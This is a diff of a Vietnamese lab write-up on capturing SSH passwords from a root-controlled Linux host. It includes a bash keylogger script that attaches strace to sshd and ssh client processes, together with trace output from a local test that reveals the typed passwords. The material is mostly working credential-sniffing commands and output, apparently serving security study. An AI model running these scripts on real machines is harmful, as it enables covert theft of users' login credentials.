@@ -60,22 +60,37 @@ Mô tả: Trường hợp đang có quyền root để truy cập vào 1 máy t�
 
    - Output:
 
-     ```
-     [pid  5405] 09:51:19 write(5, "\0\0\0\4test", 8) = 8
-     [pid  5405] 09:51:19 write(5, "\0\0\0\1d", 5) = 5
-     [pid  5405] 09:51:19 write(5, "\0\0\0\33\4", 5 <unfinished ...>
-     [pid  5405] 09:51:19 write(5, "\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0", 26 <unfinished ...>
-     [pid  5405] 09:51:24 write(5, "\0\0\0\10\f", 5) = 5
-     [pid  5405] 09:51:24 write(5, "\0\0\0\003123", 7 <unfinished ...>
-     [pid  5404] 09:51:24 read(6, "\f\0\0\0\003123", 8) = 8
-     [pid  5405] 09:51:32 write(5, "\0\0\0\23\f", 5) = 5
-     [pid  5405] 09:51:32 write(5, "\0\0\0\16BrUt3_f0rC3_m3", 18 <unfinished ...>
-     [pid  5405] 09:51:32 write(5, "\0\0\0\1f", 5) = 5
-     [pid  5551] 09:51:34 write(5, "\0\0\0\1\34", 5) = 5
-     [pid  5552] 09:51:34 openat(AT_FDCWD, "/home/test/.profile", O_RDONLY) = 3
-     ```
-
+     ```bash
+     linhtd99@ubuntu:~/Desktop/C3$ source sshd_logger.sh
      
+     [pid  6322] 21:46:21 write(5, "\0\0\0\1\0\0\0 \344.\34f#x\311}\220j(\355\261^uU!G\v\372\312$l{"..., 67) = 67
+     [pid  6322] 21:46:21 write(5, "\0\0\0\t\10", 5) = 5
+     [pid  6322] 21:46:21 write(5, "\0\0\0\4test", 8) = 8
+     [pid  6322] 21:46:21 write(5, "\0\0\0\1d", 5) = 5
+     [pid  6322] 21:46:21 write(5, "\0\0\0\33\4", 5) = 5
+     [pid  6322] 21:46:21 write(5, "\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0", 26) = 26
+     [pid  6322] 21:46:30 write(5, "\0\0\0\23\f", 5) = 5
+     [pid  6322] 21:46:30 write(5, "\0\0\0\16wrong_password", 18) = 18
+     [pid  6321] 21:46:30 read(6, "\f\0\0\0\16wrong_password", 19) = 19
+     [pid  6322] 21:46:37 write(5, "\0\0\0\23\f", 5) = 5
+     [pid  6322] 21:46:37 write(5, "\0\0\0\16BrUt3_f0rC3_m3", 18 <unfinished ...>
+     [pid  6321] 21:46:37 read(6, "\f\0\0\0\16BrUt3_f0rC3_m3", 19) = 19
+     [pid  6322] 21:46:37 write(5, "\0\0\0\1f", 5) = 5
+     [pid  6470] 21:46:38 write(5, "\0\0\0\1\34", 5) = 5
+     [pid  6471] 21:46:38 openat(AT_FDCWD, "/home/test/.profile", O_RDONLY) = 3
+     ```
+     
+   - Chạy script: `source sshd_logger.sh`
+
+   - Mô tả ý tưởng:
+
+     - Đầu tiên cần phải lấy được **PID** của `sshd`
+     - Sau đó sử dụng `strace` để ghi lại các **system call** của `sshd`
+     - `write(5, "\0\0\0\4test", 8) = 8` :arrow_forward: **username = test**
+     - `openat(AT_FDCWD, "/home/test/.profile", O_RDONLY) = 3` :arrow_forward: **Thông báo xác thực thành công**
+     - Sau khi người dùng nhập đúng password thì mới có thông báo xác thực hành công, vậy nên password đúng là password ngay trước thông báo xác thực thành công
+     - `read(6, "\f\0\0\0\16wrong_password", 19) = 19` :arrow_forward: **~~password sai = wrong_password~~**
+     - `read(6, "\f\0\0\0\16BrUt3_f0rC3_m3", 19) = 19` :arrow_forward: **password đúng = BrUt3_f0rC3_m3**
 
 2. Một người dùng đứng trên máy tính đó ssh đi một máy tính khác
 
@@ -88,14 +103,83 @@ Mô tả: Trường hợp đang có quyền root để truy cập vào 1 máy t�
      
      while [ ! $ssh_pid ];
      do
-         ssh_pid=$(ps aux | grep -v grep | grep -i "ssh" | grep -i "pts" | sed -e 's/  */ /g' | cut -d" " -f 2)
+        ssh_pid=$(ps aux | grep -v grep | grep -i "ssh" | grep -i "pts" | sed -e 's/  */ /g' | cut -d" " -f 2)
      done
      
      hostname=$(sudo ps -p $ssh_pid -o args --no-headers | cut -d " " -f 2)
-     echo -e "hostname: $hostname"
+     echo -e "Connecting to: $hostname\n"
      echo "Keylogging ..."
-     sudo strace -t -p $ssh_pid -e read  2>&1 | grep --line-buffered -F 'read' | grep "= 1" 
+     sudo strace -t -p $ssh_pid -e read,openat  2>&1 | grep --line-buffered -w -e 'openat' -e '= 1'
      ```
 
+   - Output: 
+
+     ```bash
+     linhtd99@ubuntu:~/Desktop/C3$ source ssh_logger.sh
      
+     Connecting to: test@127.0.0.1
+     
+     Keylogging ...
+     21:44:19 read(4, "w", 1)                = 1
+     21:44:26 read(4, "r", 1)                = 1
+     21:44:26 read(4, "o", 1)                = 1
+     21:44:26 read(4, "n", 1)                = 1
+     21:44:26 read(4, "g", 1)                = 1
+     21:44:26 read(4, "_", 1)                = 1
+     21:44:26 read(4, "p", 1)                = 1
+     21:44:26 read(4, "a", 1)                = 1
+     21:44:26 read(4, "s", 1)                = 1
+     21:44:26 read(4, "s", 1)                = 1
+     21:44:26 read(4, "w", 1)                = 1
+     21:44:26 read(4, "o", 1)                = 1
+     21:44:26 read(4, "r", 1)                = 1
+     21:44:26 read(4, "d", 1)                = 1
+     21:44:26 read(4, "\n", 1)               = 1
+     21:44:28 openat(AT_FDCWD, "/dev/tty", O_RDWR) = 4
+     21:44:28 openat(AT_FDCWD, "/dev/tty", O_RDWR) = 4
+     21:44:28 read(4, "B", 1)                = 1
+     21:44:32 read(4, "r", 1)                = 1
+     21:44:32 read(4, "U", 1)                = 1
+     21:44:32 read(4, "t", 1)                = 1
+     21:44:32 read(4, "3", 1)                = 1
+     21:44:32 read(4, "_", 1)                = 1
+     21:44:32 read(4, "f", 1)                = 1
+     21:44:32 read(4, "0", 1)                = 1
+     21:44:32 read(4, "r", 1)                = 1
+     21:44:32 read(4, "C", 1)                = 1
+     21:44:32 read(4, "3", 1)                = 1
+     21:44:32 read(4, "_", 1)                = 1
+     21:44:32 read(4, "m", 1)                = 1
+     21:44:32 read(4, "3", 1)                = 1
+     21:44:32 read(4, "\n", 1)               = 1
+     21:44:32 openat(AT_FDCWD, "/dev/null", O_WRONLY) = 7
+     ```
+
+   - Chạy script: `source ssh_logger.sh`
+
+   - Mô tả ý tưởng
+
+     - Vòng **while** sẽ liên tục kiểm tra xem người dùng có thực hiện ssh đến máy khác không, nếu người dùng thực hiện ssh đến máy khác thì sẽ lấy được **PID** và **hostname** tương ứng
+
+     - Ví dụ khi người dùng tiến hành `ssh test@127.0.0.1`, sử dụng `grep` kết hợp `ps` sẽ ra kết quả như sau
+
+       ```bash
+       linhtd99@ubuntu:~/Desktop$ ps aux | grep "ssh" | grep "pts" | grep -v grep
+       
+       linhtd99    2021  0.0  0.1  23244  6156 pts/1    S+   21:27   0:00 ssh test@127.0.0.1
+       ```
+
+     - **PID** cần strace là **2021**
+
+     - Command = `ssh test@127.0.0.1` :arrow_forward: **hostname = test@127.0.0.1**. 
+
+     - `openat(AT_FDCWD, "/dev/null", O_WRONLY) = 7` :arrow_forward: **Thông báo xác thực thành công**
+
+     - Kí tự `\n` là endline, mỗi một lần nhập password được ngăn cách bởi `\n`. Vậy trong trường hợp này có 2 lần nhập password là **wrong_password** và **BrUt3_f0rC3_m3**
+
+     - Tương tự như bài thực hành trên, sau khi người dùng nhập đúng password thì mới có thông báo xác thực thành công, vậy nên password đúng là password ngay trên thông báo xác thực thành công 
+
+     - :arrow_forward: **~~password sai = wrong_password~~**
+
+     - :arrow_forward: **password đúng = BrUt3_f0rC3_m3**
 
